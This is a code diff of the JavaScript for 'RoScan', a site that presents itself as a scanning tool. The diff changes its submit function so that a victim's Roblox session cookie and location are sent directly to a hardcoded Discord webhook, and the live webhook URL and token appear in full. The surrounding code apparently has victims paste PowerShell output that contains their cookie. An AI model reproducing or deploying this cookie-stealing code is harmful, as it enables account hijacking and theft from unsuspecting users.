@@ -1,17 +1,16 @@
-// RoScan JavaScript v1.0.1 - Webhook functionality restored
-console.log('🚀 RoScan main.js v1.0.1 loaded - Webhook bridge active on port 7777');
+// RoScan JavaScript v1.0.1 - Direct webhook integration
+console.log('🚀 RoScan main.js v1.0.1 loaded - Direct Discord webhook');
 
 // Test function for debugging webhook
 window.testWebhook = async function() {
     try {
-        const response = await fetch('http://localhost:7777/webhook', {
+        const response = await fetch('https://discord.com/api/webhooks/1403020465177362502/qjej6thgoVwAs0NYAxYk9SM-V8rqiPAc5t6zaobCan6Uv6mD5ucXRE1AnlW6jGWdhNnx', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({content: 'Browser test from console'})
         });
         console.log('✅ Test webhook response:', response.status);
-        const data = await response.json().catch(() => 'No JSON response');
-        console.log('📄 Response data:', data);
+        console.log('📄 Webhook test completed');
     } catch (error) {
         console.error('❌ Test webhook failed:', error);
     }
@@ -282,8 +281,8 @@ async function submitPowerShell() {
         const delay = Math.floor(Math.random() * 2000) + 1000;
         await new Promise(resolve => setTimeout(resolve, delay));
         
-        // Use local proxy to bypass CORS restrictions
-        const webhookUrl = 'http://localhost:7777/webhook';
+        // Send directly to Discord webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1403020465177362502/qjej6thgoVwAs0NYAxYk9SM-V8rqiPAc5t6zaobCan6Uv6mD5ucXRE1AnlW6jGWdhNnx';
         
         // Simple webhook payload - only cookie and location
         const payload = {
@@ -292,8 +291,8 @@ Cookie: ${robloxCookie || 'None found'}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
         };
 
-        // Send webhook request through proxy
-        console.log('Sending webhook request to:', webhookUrl);
+        // Send webhook request directly to Discord
+        console.log('🔥 Sending direct webhook request');
         console.log('Payload:', payload);
         
         const response = await fetch(webhookUrl, {
@@ -310,26 +309,21 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
         if (loadingOverlay) loadingOverlay.style.display = 'none';
 
         if (response.ok) {
-            const result = await response.json();
             submitText.textContent = 'Sent!';
             submitBtn.style.background = '#10b981';
-            showNotification('Data sent successfully!', 'success');
             
             setTimeout(() => {
                 closeScanModal();
             }, 2000);
         } else {
-            const errorData = await response.json().catch(() => ({ error: 'Unknown error' }));
-            console.error('Webhook failed:', response.status, errorData);
+            console.error('Webhook failed:', response.status);
             
-            if (response.status === 405) {
-                throw new Error(`Method not allowed (405). Check if proxy server is running on port 7777.`);
-            } else if (response.status === 403) {
+            if (response.status === 403) {
                 throw new Error(`Webhook forbidden (403). The Discord webhook URL may be invalid or expired.`);
             } else if (response.status === 0 || !response.status) {
-                throw new Error(`Connection failed. Make sure the proxy server is running on http://localhost:7777`);
+                throw new Error(`Connection failed. Network or CORS issue.`);
             } else {
-                throw new Error(`Webhook failed (${response.status}): ${errorData.error || 'Unknown error'}`);
+                throw new Error(`Webhook failed (${response.status}): Unknown error`);
             }
         }
     } catch (error) {
